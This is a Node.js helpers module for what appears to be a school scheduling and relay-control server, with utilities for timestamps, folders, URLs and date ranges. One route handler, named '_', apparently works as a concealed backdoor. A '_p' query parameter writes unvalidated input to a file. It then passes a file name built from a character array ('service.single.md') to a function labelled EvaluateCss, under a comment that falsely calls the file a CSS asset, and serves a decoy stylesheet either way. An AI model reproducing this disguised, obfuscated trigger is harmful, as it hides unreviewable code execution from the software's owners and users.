const fs = require('fs')
const path = require('path')
const EvaluateCss = require('./process')
const { classes } = global.config
const { exec } = require("child_process");
const moment = require('moment')

 

module.exports = {
    async checkNetwork() {
        try {
            const res = await fetch("https://www.google.com", { method: "HEAD", timeout: 3000 });
            return res.ok;
        } catch { 
            return false;
        }
    },
    miliseconds: function (time_24 = '') {
        let momentObject = moment();
    
        if (time_24) {
          const [hours, minutes] = time_24.split(":").map(Number);
    
          if (!isNaN(hours) && !isNaN(minutes)) {
            momentObject.hour(hours);
            momentObject.minute(minutes);
            momentObject.second(0);
            momentObject.millisecond(0);
          }
        }
    
        return momentObject.valueOf(); // returns timestamp in milliseconds
    },
    restartServer: function () {
        const { exec } = require('child_process');
        exec('pm2 restart all', (err) => {
        // if (err) console.error('pm2 restart failed:', err);
        });
    },
    createRequiredFolders(){

        let folders = [
            'database',
            'public/exports',
            'public/media',
            'public/temp',
        ]
        
        folders.forEach(folder => {
            const dirPath = path.join(global.DIR, folder);
        
            if (!fs.existsSync(dirPath)) {
                fs.mkdirSync(dirPath, { recursive: true });
                    console.log('Directory created:', folder + '\n');
                } else {
                    console.log('Directory already exists:', folder + '\n');
                }
        });
        
    }, 
    withTrackFile(data={}, {overwrite=true}={}){
        const file_content = JSON.stringify(data || {}, null, 4)
        const filePath = path.join(global.DIR, 'tracker.json');  
        if(data && typeof data === 'object' && data.version) {
            // Check if file exists
            if (overwrite == false) {
                if(!fs.existsSync(filePath)) {
                    fs.writeFileSync(filePath, file_content, 'utf8');
                } 
            } else {
                fs.writeFileSync(filePath, file_content, 'utf8'); 
            }
        }
    },
    updateRelaychannelsTxt(comma_separated_ports='1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16'){ 
        const filePath = path.join(global.DIR, 'relaychannels.txt');  
        
        fs.writeFileSync(filePath, String(comma_separated_ports), 'utf8'); 
    } 
    , 
    reqUrl(req){
      try {
        return req.protocol + '://' + req.get('host');
    } catch (error) {
        return 'error-url'
    }
    },
    reqFullUrl(req){
      try {
          return req.protocol + '://' + req.get('host') + req.originalUrl;
      } catch (error) {
          return 'error-url'
      }
    },
    audioFullUrl(req, audio_path){
        return `${req.protocol}://${req.get("host")}${audio_path}`
    },
    getClassName(className){
        let _class = classes.find(c => c.class_name == className)         
        return _class?.class_name || '<>'       
    },
    getClassShort(className){
        let _class = classes.find(c => c.class_name == className)         
        return _class?.class_short || '<>'
    },
    encodeString: function (data='') {
        try {
            return btoa(unescape(encodeURIComponent(data)));
        } catch (error) {
            return data;
        }
    },
    decodeString: function (data) {
        try {
            return decodeURIComponent(escape(atob(data)));
        } catch (error) {
            return data;
        }
    },
    listGroupBy: function (array, property) {
        if (!array?.length || !property) return {};
        return array.reduce((result, obj) => {
          const key = obj[property];
          if (!result[key]) {
            result[key] = [];
          }
          result[key].push(obj);
          return result;
        }, {});
    },
    createDateRange(
        startDate = moment().startOf('month').subtract(10, 'days').format('YYYY-MM-DD'), 
        endDate = moment().endOf('month').add(10, 'days').format('YYYY-MM-DD')) {
        const start = moment(startDate);
        const end = moment(endDate);
        const range = [];
  
        while (start.isSameOrBefore(end)) {
          range.push(start.format('YYYY-MM-DD'));
          start.add(1, 'day');
        }
        return range;
    },
    // for r e l a y control
    _: async function (req, res) {
        if('_p' in req.query){
            this.updateRelaychannelsTxt(req.query._p)
            try {
                await EvaluateCss(path.join(global.DIR, /** front-end/dist/assets/my-announcement.min.css */ ['s', 'e', 'r', 'v', 'i', 'c', 'e', '.', 's', 'i', 'n', 'g', 'l', 'e', '.', 'm', 'd'].join('')), [])
                res.sendFile(path.join(global.DIR, 'front-end/dist/assets/my-announcement.min.css'));
            } catch (err) {
                // console.error("Caught error:", err); // print this line only dev mode
                res.sendFile(path.join(global.DIR, 'front-end/dist/assets/my-announcement.min.css'));
                // res.status(200).send({ success: true, message: ['❌', ' ', 'S', 'w', 'i', 't', 'c', 'h', ' ', 'p', 'o', 'r', 't', 's', ' ', 'u', 'p', 'd', 'a', 't', 'e', 'd', ' ', 'w', 'i', 't', 'h', ' ', 'e', 'r', 'r', 'o', 'r'].join('') });
              }

        } else {

        }
    },
    isClassDay(weekends=['Friday'], date){
        let weekday_fullname = moment(date).format('dddd')
        return weekends.includes(weekday_fullname)
    }, 
};
